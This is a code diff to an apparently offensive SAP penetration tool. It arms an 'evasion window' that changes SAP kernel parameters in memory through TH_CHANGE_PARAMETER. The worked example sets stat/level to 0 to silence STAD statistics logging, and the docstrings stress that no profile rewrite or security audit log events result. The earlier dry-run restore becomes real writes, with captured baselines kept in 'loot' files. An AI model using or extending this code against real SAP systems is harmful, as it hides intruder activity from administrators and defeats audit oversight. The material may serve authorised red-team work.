@@ -4,9 +4,9 @@ Every Tier 3 action that mutates target state runs inside an
 ``evasion_window(node, state, technique)`` context manager:
 
     with evasion_window(node, state, "stad_silence") as w:
-        rz11_set(node, "stat/level", "0")    # mutate
+        change_param(node, creds, "stat/level", "0")   # mutate
         # ... operator work that depends on STAD being off ...
-    # __exit__ restores rsa/level to the captured baseline value
+    # __exit__ restores stat/level to the captured baseline value
     # exactly once, no matter how the body exited.
 
 The window is implemented in three layers:
@@ -24,11 +24,13 @@ The window is implemented in three layers:
    touched key.
 
 3. ``restore_baseline(node, creds, snapshot, only=...)`` writes the
-   captured values back via the same RFC FMs that wrote them (RZ11 /
-   TH_PUT_PROFILE_PARAMETER / RFC_READ_TABLE+UPDATE).
+   captured values back via ``change_param`` which wraps the RFC-
+   enabled kernel FM ``TH_CHANGE_PARAMETER``.  Dynamic, in-memory only
+   — no profile file rewrite, no kernel restart, no AUM/AUW.
 
-This file only defines the data carrier + capture/restore primitives;
-each Tier 3 technique imports and wraps itself in the window.
+This file only defines the data carriers + capture / write / restore
+primitives; each Tier 3 technique imports and wraps itself in the
+window.
 """
 
 from __future__ import annotations
@@ -190,6 +192,54 @@ def capture_baseline(node, creds=None,
 
 
 # ---------------------------------------------------------------------------
+# Writer — TH_CHANGE_PARAMETER
+# ---------------------------------------------------------------------------
+
+def change_param(node, creds, name: str, value: str) -> dict:
+    """Dynamically write an SAP profile parameter via TH_CHANGE_PARAMETER.
+
+    ``TH_CHANGE_PARAMETER`` is the RFC-enabled kernel FM that updates
+    a parameter at runtime in shared memory.  No profile file is
+    rewritten, no AUM/AUW SAL events are emitted, and the change
+    survives until the instance restarts (or until restore_baseline
+    rewrites it).  Parameter names are case-sensitive at the kernel
+    boundary (same as TH_GET_PARAMETER on the read side).
+
+    Returns a dict::
+
+        {"ok": bool, "name": str, "value": str, "error": str}
+
+    Raises nothing — even auth-denial / parameter-unknown failures
+    are captured in the ``error`` field so the caller can decide
+    whether to abort or continue.  The window context manager relies
+    on this contract: a failed write is reported but doesn't stop
+    restore from attempting the remaining params.
+    """
+    import sapmap_rfc
+    from sapmap_errors import format_rfc_exception
+
+    try:
+        with sapmap_rfc._get_connection(node, creds) as conn:
+            r = conn.call("TH_CHANGE_PARAMETER",
+                           PARAMETER_NAME=name,
+                           PARAMETER_VALUE=value)
+            # TH_CHANGE_PARAMETER returns RC=0 on success.  Some
+            # kernels also surface RETURN_CODE; treat any non-empty
+            # non-zero rc as a failure.
+            rc = r.get("RC", r.get("RETURN_CODE", "0"))
+            rc_str = str(rc).strip()
+            if rc_str not in ("", "0"):
+                msg = (r.get("MESSAGE") or r.get("ERROR_MESSAGE")
+                       or f"RC={rc_str}")
+                return {"ok": False, "name": name, "value": value,
+                        "error": str(msg)[:200]}
+            return {"ok": True, "name": name, "value": value, "error": ""}
+    except Exception as e:
+        msg = format_rfc_exception(e).split("\n")[0][:200]
+        return {"ok": False, "name": name, "value": value, "error": msg}
+
+
+# ---------------------------------------------------------------------------
 # Restore
 # ---------------------------------------------------------------------------
 
@@ -210,13 +260,10 @@ def restore_baseline(node, creds, snapshot: BaselineSnapshot,
             "snapshot_path": <loot json file>,
         }
 
-    NOTE: the actual RZ11 ``RZL_PUT_VALUE`` / ``TH_PUT_PARAMETER``
-    primitive is implemented in a follow-up commit.  This function
-    currently just *logs the intended restore action* — the operator
-    sees exactly what would be written back, but no kernel mutation
-    happens.  Wired this way so the Tier 3 foundation can land and be
-    smoke-tested without arming the actual mutation primitive on a
-    real system.
+    Each write uses ``change_param`` (TH_CHANGE_PARAMETER).  A failed
+    write is recorded under ``skipped`` so the operator sees which
+    params were left in their mutated state; the remaining keys are
+    still attempted.
     """
     out = {"restored": [], "skipped": [],
             "snapshot_path": snapshot.loot_path}
@@ -232,15 +279,16 @@ def restore_baseline(node, creds, snapshot: BaselineSnapshot,
         if isinstance(original, str) and original.startswith("__UNCAPTURED__"):
             out["skipped"].append((pname, "param was uncapturable"))
             continue
-        # Log the intended write.  Real RZL_PUT_VALUE invocation lands
-        # in the next commit; we want a working foundation + visible
-        # operator trace before arming the mutation primitive.
-        logger.info(f"{snapshot.sid}: [evasion-restore] would write "
-                     f"{pname}={original!r} (dry-run — write primitive "
-                     "not yet wired)")
-        print(f"[*] {snapshot.sid}: evasion-restore — {pname}="
-              f"{original!r} (dry-run)")
-        out["restored"].append(pname)
+        # Real write — TH_CHANGE_PARAMETER, dynamic, no profile rewrite.
+        r = change_param(node, creds, pname, str(original))
+        if r["ok"]:
+            print(f"[+] {snapshot.sid}: evasion-restore — "
+                  f"{pname}={original!r}")
+            out["restored"].append(pname)
+        else:
+            print(f"[!] {snapshot.sid}: evasion-restore FAILED "
+                  f"{pname}={original!r} — {r['error']}")
+            out["skipped"].append((pname, r["error"]))
 
     return out
 
